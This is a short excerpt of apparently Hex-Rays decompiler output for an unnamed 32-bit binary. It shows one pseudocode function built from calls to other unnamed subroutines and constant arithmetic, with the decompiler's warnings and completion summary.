// 413D9E: variable 'v133' is possibly undefined
// 413D9E: variable 'v134' is possibly undefined
// 413DAD: variable 'v135' is possibly undefined
// 413DAD: variable 'v136' is possibly undefined
// 413DBE: variable 'v137' is possibly undefined
// 413DCE: variable 'v138' is possibly undefined

//----- (0041415A) --------------------------------------------------------
int __fastcall sub_41415A(int a1, int a2, int a3, int a4)
{
  int v4; // eax
  unsigned int v5; // edx
  __int16 v6; // cx
  int v7; // eax
  char v8; // cf
  unsigned int v9; // edx
  unsigned int v10; // ecx
  int result; // eax
  int v12; // ecx
  void *v13; // ecx
  int v14; // eax
  void *v15; // ecx
  unsigned int v16; // edx
  unsigned int v17; // ecx
  int v18; // eax
  char v19[32]; // [esp+18h] [ebp-100h] BYREF
  char v20[8]; // [esp+64h] [ebp-B4h] BYREF
  int v21; // [esp+6Ch] [ebp-ACh]
  int v22; // [esp+78h] [ebp-A0h]
  int v23; // [esp+E4h] [ebp-34h]
  unsigned __int16 v24; // [esp+108h] [ebp-10h]

  sub_41188A((int)v19, a2, 7, (int)v19);
  v4 = ((2 * sub_413ACB(49, (int)v20, 0)) ^ 0x24D7) - 10370 + 5749;
  v22 += v4;
  v18 = v4 | 0x7CD;
  if ( (v6 & 0x136B) != 0 )
    v18 -= 6272;
  v14 = v21 | v18;
  v7 = sub_411C99((unsigned int)v20, v5, 0, v14, (int)v20, 0);
  sub_411EBC(v8 + v7 + 4693, v9, v10);
  sub_411F4C(v15, 22, 49, 19, 1057969774);
  sub_411EBC(12010, v16, v17);
  sub_411F4C(v13, 15, 35, 7, 186023180);
  result = 5494;
  if ( v23 != v12 )
    result = v24 | 0x1D4;
  return result;
}
// 413F86: conditional instruction was optimized away because of 'eax.4>=7CDu'
// 412B93: variable 'v5' is possibly undefined
// 412B98: variable 'v8' is possibly undefined
// 412BA2: variable 'v9' is possibly undefined
// 412BA2: variable 'v10' is possibly undefined
// 413E6E: variable 'v15' is possibly undefined
// 413E81: variable 'v16' is possibly undefined
// 413E81: variable 'v17' is possibly undefined
// 413736: variable 'v13' is possibly undefined
// 412EC2: variable 'v12' is possibly undefined
// 413F78: variable 'v6' is possibly undefined

// nfuncs=30 queued=29 decompiled=29 lumina nreq=0 worse=0 better=0
// ALL OK, 29 function(s) have been successfully decompiled
